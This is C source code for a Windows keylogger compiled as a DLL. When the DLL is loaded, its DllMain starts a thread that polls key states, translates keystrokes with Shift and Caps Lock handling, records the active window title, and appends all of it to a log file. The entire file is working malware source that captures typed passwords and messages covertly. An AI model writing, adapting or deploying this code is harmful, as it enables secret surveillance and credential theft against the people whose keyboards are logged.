#include "keylogger.h"

int shiftPressed = 0;
int altPressed = 0;
int ctrlPressed = 0;

void logKey(const char *input) {
    if (!input || *input == '\0') return;
    
    FILE *file = fopen(LOGFILE, "a");
    if (!file) {
        perror("Error opening log file");
        return;
    }
    
    if (fputs(input, file) == EOF) {
        perror("Error writing to log file");
    }
    
    if (fclose(file) == EOF) {
        perror("Error closing log file");
    }
}

int handleSpecialKeys(int key) {
    switch (key) {
        case VK_SPACE:      logKey(" "); return 1;
        case VK_RETURN:     logKey("\n"); return 1;
        case VK_BACK:       logKey("[BACKSPACE]"); return 1;
        case VK_TAB:        logKey("[TAB]"); return 1;
        case VK_CAPITAL:    logKey("[CAPS_LOCK]"); return 1;
        case VK_UP:         logKey("[UP_ARROW]"); return 1;
        case VK_DOWN:       logKey("[DOWN_ARROW]"); return 1;
        case VK_LEFT:       logKey("[LEFT_ARROW]"); return 1;
        case VK_RIGHT:      logKey("[RIGHT_ARROW]"); return 1;
        case VK_CONTROL:    
            if (!ctrlPressed) { 
                logKey("[CTRL]"); 
                ctrlPressed = 1; 
            } 
            return 1;
        case VK_MENU:       
            if (!altPressed) { 
                logKey("[ALT]"); 
                altPressed = 1; 
            } 
            return 1;
        case VK_SHIFT:      
            shiftPressed = 1; 
            return 1;
        default: 
            return 0;
    }
}

char mapWithShift(int key) {
    switch (key) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case VK_OEM_MINUS: return '_';
        case VK_OEM_PLUS:  return '+';
        case VK_OEM_4:     return '{';
        case VK_OEM_6:     return '}';
        case VK_OEM_5:     return '|';
        case VK_OEM_1:     return ':';
        case VK_OEM_7:     return '\"';
        case VK_OEM_COMMA: return '<';
        case VK_OEM_PERIOD: return '>';
        case VK_OEM_2:     return '?';
        case VK_OEM_3:     return '~';
        default:           return (char)toupper(key);
    }
}

void handleKeyPress(int key) {
    char keyChar[2] = {0}; 

    // Handle special keys:
    if (handleSpecialKeys(key))
        return;

    // Handle letters:
    if (key >= 'A' && key <= 'Z') {
        int capsLockActive = GetKeyState(VK_CAPITAL) & CAPSLOCK_MASK;
        int upper = shiftPressed ^ capsLockActive;
        keyChar[0] = upper ? (char)key : (char)(key + 32);
    }
    // Handle digits:
    else if (key >= '0' && key <= '9') {
        keyChar[0] = shiftPressed ? mapWithShift(key) : (char)key;
    }
    // Handle symbols:
    else {
        switch (key) {
            case VK_OEM_MINUS:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_MINUS) : '-';
                break;
            case VK_OEM_PLUS:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_PLUS) : '=';
                break;
            case VK_OEM_4:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_4) : '[';
                break;
            case VK_OEM_6:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_6) : ']';
                break;
            case VK_OEM_5:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_5) : '\\';
                break;
            case VK_OEM_1:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_1) : ';';
                break;
            case VK_OEM_7:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_7) : '\'';
                break;
            case VK_OEM_COMMA:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_COMMA) : ',';
                break;
            case VK_OEM_PERIOD:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_PERIOD) : '.';
                break;
            case VK_OEM_2:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_2) : '/';
                break;
            default:
                if (isprint(key))
                    keyChar[0] = (char)key;
                break;
        }
    }

    if (keyChar[0] != 0)
        logKey(keyChar);
}

void handleKeyRelease(int key) {
    if (key == VK_SHIFT)
        shiftPressed = 0;
    if (key == VK_MENU)
        altPressed = 0;
    if (key == VK_CONTROL)
        ctrlPressed = 0;
}

void updateWindowTitle() {
    static char lastWindowTitle[WINDOW_TITLE_BUFFER_SIZE] = {0};
    HWND currentWindow = GetForegroundWindow();
    char windowTitle[WINDOW_TITLE_BUFFER_SIZE] = {0};

    if (currentWindow != NULL) {
        GetWindowText(currentWindow, windowTitle, sizeof(windowTitle));
    }

    if (strlen(windowTitle) > 0 && strcmp(windowTitle, lastWindowTitle) != 0) {
        strcpy(lastWindowTitle, windowTitle);
        char titleLog[TITLE_LOG_BUFFER_SIZE] = {0};
        snprintf(titleLog, sizeof(titleLog), "\n[window: %s]\n", windowTitle);
        logKey(titleLog);
    }
}


DWORD WINAPI KeyloggerThread(LPVOID lpParameter) {

    int keyStates[KEY_CODE_MAX] = {0};

    while (1) {
        updateWindowTitle();
        Sleep(SLEEP_INTERVAL_MS);
        for (int key = KEY_CODE_MIN; key < KEY_CODE_MAX; key++) {
            SHORT keyState = GetAsyncKeyState(key);
            if (keyState & KEY_PRESSED) {
                if (!keyStates[key]) {
                    handleKeyPress(key);
                    keyStates[key] = 1;
                }
            } else {
                if (keyStates[key]) {
                    handleKeyRelease(key);
                    keyStates[key] = 0;
                }
            }
        }
    }
    return 0;
}

/* DLL Entry Point */
BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    HANDLE hThread;
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
            if (hThread)
                CloseHandle(hThread);
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
